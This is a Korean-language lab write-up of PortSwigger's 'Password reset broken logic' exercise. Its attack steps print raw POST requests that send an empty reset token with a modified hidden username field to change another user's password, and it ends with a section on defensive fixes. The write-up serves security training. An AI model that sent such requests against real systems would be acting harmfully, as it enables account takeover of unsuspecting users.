# Lab: Password reset broken logic

## 개요

- **난이도**: Practitioner
- **주제**: Authentication — 비밀번호 재설정(Password Reset) 취약 로직 / 토큰 미검증 / username 파라미터 신뢰
- **링크**: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

## 목표

비밀번호 재설정 기능의 결함을 이용해 `carlos` 의 비밀번호를 임의로 변경하고, 그 계정으로 로그인해 `My account` 에 접근한다.

- 내 계정: `wiener:peter`
- 피해자: `carlos`

## 비밀번호 재설정 흐름

```
[정상 흐름]
  1. 사용자가 "Forgot your password?" 에 username 입력
  2. 서버가 재설정 토큰 생성 → 이메일로 재설정 링크 전송
     GET /forgot-password?temp-forgot-password-token=<TOKEN>
  3. 사용자가 링크 클릭 → 새 비밀번호 입력 폼
  4. POST /forgot-password?temp-forgot-password-token=<TOKEN>
     폼 전송 (username, token 등 포함)
  5. 서버가 토큰 검증 후 해당 계정 비밀번호 변경

[보안의 핵심]
  "이 요청을 보낸 사람이 정말 그 계정 소유자인가?"
  → 재설정 토큰이 그 근거가 되어야 함
```

## 취약 지점

### 1. 토큰이 실제로 검증되지 않음

새 비밀번호 제출 요청에서 토큰 값을 비워도 재설정이 성공한다.
즉, 서버가 `temp-forgot-password-token` 을 확인하지 않는다.

```
POST /forgot-password?temp-forgot-password-token=  HTTP/1.1
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&new-password-1=abc&new-password-2=abc
```

### 2. username 이 클라이언트 입력(숨겨진 필드)으로 전달됨

재설정 대상 계정이 요청 body 의 `username` 으로 결정된다.
토큰과 username 이 서로 묶여(binding) 있지 않다.

```
username=wiener      ← 숨겨진 필드, 클라이언트가 변경 가능
```

### 결합된 문제

```
토큰 검증 X  +  username 을 클라이언트가 지정  =  임의 계정 비밀번호 재설정

공격자는 자기 토큰(또는 빈 토큰)으로
username 만 carlos 로 바꿔 요청 → carlos 비밀번호 변경
```

## 공격 단계

### 1단계 — 비밀번호 재설정 흐름 관찰

`Forgot your password?` 에 자신의 username(`wiener`)을 입력한다.
이메일 클라이언트에서 재설정 링크를 열고 새 비밀번호를 설정한다.
이 과정의 요청을 Burp 로 기록한다.

```
POST /forgot-password?temp-forgot-password-token=<TOKEN> HTTP/1.1
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=<TOKEN>&username=wiener
&new-password-1=mynewpass&new-password-2=mynewpass
```

### 2단계 — 토큰이 검증되는지 확인

동일 요청에서 토큰 값을 삭제하고 전송한다.

```
POST /forgot-password?temp-forgot-password-token= HTTP/1.1

temp-forgot-password-token=&username=wiener
&new-password-1=mynewpass&new-password-2=mynewpass
```

재설정이 성공하면 → **토큰이 검증되지 않음**을 확인.

### 3단계 — username 을 carlos 로 변경

토큰 없이, `username` 만 `carlos` 로 바꾸고 새 비밀번호를 지정한다.

```
POST /forgot-password?temp-forgot-password-token= HTTP/1.1
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos
&new-password-1=carlos123&new-password-2=carlos123
```

서버가 `carlos` 의 비밀번호를 변경한다.

### 4단계 — carlos 로 로그인

```
username=carlos&password=carlos123
```

로그인 후 `My account` 접근 → 랩 해결.

## 취약 로직 정리

```
[서버가 해야 할 검증]
  1) temp-forgot-password-token 이 유효한가?
  2) 그 토큰이 가리키는 계정이 누구인가?
  3) 요청의 username 이 토큰의 계정과 일치하는가?

[취약한 서버 동작]
  1) 토큰 검증 안 함 (빈 값도 통과)
  2) username 을 body 값 그대로 사용
  → 누구든 임의 계정 비밀번호를 재설정 가능
```

## 방어

```
[근본 원인]
  토큰 미검증 + 재설정 대상(username)을 클라이언트가 지정

[올바른 방어]
  1. 재설정 토큰을 서버에서 반드시 검증
     - 존재/유효 여부, 만료 시간 확인
     - 일회용(one-time) 처리, 사용 후 즉시 무효화
     - 충분히 길고 예측 불가능한 난수 사용
  2. 토큰과 사용자를 서버 측에서 바인딩
     - 토큰 → 계정 매핑을 서버 저장소에서 조회
     - 요청의 username 을 신뢰하지 않음
       (토큰으로 계정을 결정하고, username 파라미터는 무시)
  3. 재설정 완료 시 사용자에게 알림 (이메일)
  4. 재설정 요청에 대한 rate limiting
  5. 비밀번호 변경 후 기존 세션 무효화

[안티패턴]
  토큰을 URL/body 에 넣어두고 실제 검증은 생략
  username(hidden field)을 그대로 재설정 대상으로 사용
  만료 없는 토큰, 재사용 가능한 토큰
```

## 핵심 정리

- 재설정 토큰이 검증되지 않아 빈 토큰으로도 통과했고, `username` 숨겨진 필드를 `carlos` 로 바꿔 타 계정 비밀번호를 변경했다.
- 재설정 대상 계정을 클라이언트가 지정하는 구조에서 토큰-계정 바인딩이 없으면 임의 계정 탈취로 이어진다.
- 방어는 토큰의 서버 측 검증(존재·만료·일회용)과 토큰→계정 바인딩이며, username 파라미터를 신뢰하지 않는 것이다.

## 배운 점

- 비밀번호 재설정은 인증과 동등한 권한을 가지므로, 토큰이 "소유자 증명" 의 유일한 근거다.
- 토큰 값이 그대로 남아 있어도, 서버가 검증하지 않으면 아무 의미가 없다.
- 2FA 우회(002)에 이어, 이 랩도 "검증 단계를 서버가 강제하는가" 라는 동일한 질문으로 요약된다.
